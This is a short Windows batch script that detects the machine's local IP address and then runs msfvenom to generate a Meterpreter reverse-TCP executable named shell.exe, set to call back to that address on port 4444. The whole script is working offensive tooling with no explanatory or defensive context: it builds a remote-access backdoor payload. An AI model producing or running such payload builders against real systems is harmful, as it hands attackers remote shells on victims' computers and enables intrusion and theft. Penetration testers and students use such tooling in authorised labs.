@echo off
setlocal

set "LocalIP="
for /f "usebackq delims=" %%i in (`powershell -NoProfile -Command "Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -eq 'Up' } | ForEach-Object { $_.IPv4Address.IPAddress } | Select-Object -First 1"`) do set "LocalIP=%%i"

msfvenom -p windows/meterpreter/reverse_tcp LHOST=%LocalIP% LPORT=4444 -f exe -o %~dp0shell.exe

exit

endlocal